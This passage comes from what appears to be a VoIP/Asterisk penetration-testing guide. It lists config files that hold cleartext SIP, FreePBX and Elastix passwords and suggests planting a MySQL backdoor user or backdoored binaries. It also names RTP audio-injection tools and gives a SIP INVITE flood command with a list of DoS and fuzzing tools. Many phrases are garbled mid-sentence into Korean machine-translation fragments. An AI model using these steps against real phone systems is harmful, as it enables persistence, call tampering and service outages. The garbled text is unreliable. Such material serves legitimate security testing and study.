- **`sip.conf`** -> Contains the password of SIP users.
- If the **Asterisk server is running as root**, you could compromise root
- **mysql root user** might **비밀번호가 없을 수 있습니다**.
- this could be used to create a new mysql user as backdoor
- **`FreePBX`**
- **`amportal.conf`** -> Contains the password of the web panel administrator (FreePBX)
- **`FreePBX.conf`** -> Constains the password of the user FreePBXuser used to access the database
- this could be used to create a new mysql user as backdoor
- **`Elastix`**
- **`Elastix.conf`** -> Contains several passwords in clear text like mysql root pass, IMAPd pass, web admin pass
- **여러 폴더** will belong to the compromised asterisk user (if not running as root). This user can read the previous files and also controls the configuration, so he could make Asterisk to load other backdoored binaries when executed.

### RTP Injection

It's possible to insert a **`.wav`** in conversations using tools such as **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) and **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Or you could use the scripts from [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) to **대화 스캔** (**`rtpscan.pl`**), send a `.wav` to a conversation (**`rtpsend.pl`**) and **소음 삽입** in a conversation (**`rtpflood.pl`**).

### DoS

There are several ways to try to achieve DoS in VoIP servers.

- **`SIPPTS flood`** from [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood sends unlimited messages to the target.
- `sippts flood -i 10.10.0.10 -m invite -v`
- **`SIPPTS ping`** from [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping makes a SIP ping to see the server response time.
- `sippts ping -i 10.10.0.10`
- [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS IAX protocol used by Asterisk
- [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): A tool to perform SIP/SDP INVITE message flooding over UDP/IP.
- [**rtpflood**](https://www.kali.org/tools/rtpflood/): Send several well formed RTP packets. Its needed to know the RTP ports that are being used (sniff first).
- [**SIPp**](https://github.com/SIPp/sipp): Allows to analyze and generate SIP traffic. so it can be used to DoS also.
- [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP swiss army knife. Can also be used to perform SIP attacks.
- Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### OS Vulnerabilities

The easiest way to install a software such as Asterisk is to download an **OS distribution** that has it already installed, such as: **FreePBX, Elastix, Trixbox**... The problem with those is that once it's working sysadmins might **다시 업데이트하지 않을 수 있습니다** and **취약점** are going to be discovered with time.

## References

- [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
- [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
- [http://blog.pepelux.org/](http://blog.pepelux.org/)
- [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
- [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
- [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{{#include ../../banners/hacktricks-training.md}}
